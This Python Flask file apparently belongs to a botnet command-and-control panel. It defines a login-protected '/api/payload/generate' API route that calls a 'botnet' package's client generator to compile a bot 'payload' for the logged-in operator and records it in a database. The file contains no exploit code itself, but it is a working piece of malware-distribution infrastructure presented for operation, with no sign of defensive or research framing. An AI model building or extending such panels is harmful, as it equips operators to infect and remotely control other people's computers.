import os
from flask import Blueprint, request
from flask_login import current_user, login_required
from botnet import client_gen, utils
from botnet.dao import payload_dao

payload = Blueprint('payload', __name__, url_prefix='/api/payload')

@payload.route("/generate", methods=["POST"])
@login_required
def payload_generate():
	payload_format = request.form.get('format')

	try:
		outfile = client_gen.main(current_user.username)
		filename = os.path.basename(outfile)
		payload_dao.add_user_payload(current_user.id, filename.split('.')[0], payload_format)
		return('Successfully generated payload: ' + os.path.basename(outfile), 'success')
	except Exception as e:
		utils.log("Exception in api.routes.payload.payload_generate: " + str(e))
		return('Error: compilation timed out or failed.', 'error')